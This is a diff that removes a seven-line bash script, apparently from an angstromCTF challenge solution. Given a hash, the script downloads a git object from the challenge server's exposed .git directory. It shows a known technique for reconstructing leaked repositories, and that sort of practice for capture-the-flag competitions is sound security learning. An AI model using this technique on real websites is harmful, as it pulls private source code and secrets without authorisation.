@@ -1,7 +1,0 @@
-#!/bin/bash
-hash="${1}";
-dir="${hash:0:2}";
-file="${hash:2:38}";
-mkdir -p ".git/objects/${dir}";
-path=".git/objects/${dir}/${file}";
-curl -s "http://web2.angstromctf.com:8899/files/${path}" > "${path}";
